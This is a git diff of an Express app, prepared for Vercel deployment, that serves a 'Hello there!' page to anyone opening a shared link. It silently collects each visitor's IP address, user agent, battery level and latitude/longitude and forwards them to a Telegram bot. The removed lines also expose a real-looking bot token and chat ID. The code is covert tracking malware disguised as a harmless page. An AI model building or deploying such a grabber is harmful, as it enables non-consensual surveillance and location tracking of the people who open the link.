@@ -1,10 +1,9 @@
 const express = require('express');
 const axios = require('axios');
 const app = express();
-const port = 3000;
 
-const TELEGRAM_BOT_TOKEN = '7749604293:AAHlRr16NUJPHRiQ4QqbRkMKQMzVqFDrUCw';
-const TELEGRAM_CHAT_ID = '7064862085';
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
+const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
 
 const sendToTelegram = (message) => {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -14,8 +13,9 @@ const sendToTelegram = (message) => {
   }).catch(err => console.error('Error sending message:', err));
 };
 
+// Main route — this is what your public link will show
 app.get('/', (req, res) => {
-  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   let userAgent = req.headers['user-agent'];
 
   let script = `
@@ -30,27 +30,29 @@ app.get('/', (req, res) => {
 
       fetch('/user?id=' + navigator.userAgent);
     </script>
+    <h1>Hello there!</h1>
   `;
   res.send(script);
   sendToTelegram('New visitor IP: ' + ip + '\nUser Agent: ' + userAgent);
 });
 
+// Battery route
 app.get('/battery', (req, res) => {
   sendToTelegram('Battery Level: ' + req.query.level);
   res.send('Battery level received');
 });
 
+// Location route
 app.get('/location', (req, res) => {
   sendToTelegram('Location: ' + req.query.lat + ', ' + req.query.long);
   res.send('Location received');
 });
 
+// User agent route
 app.get('/user', (req, res) => {
   sendToTelegram('User Agent: ' + req.query.id);
   res.send('User info received');
 });
 
-app.listen(port, () => {
-  console.log(`Listening on port ${port}`);
-});
- 
+// Export the app for Vercel
+module.exports = app;
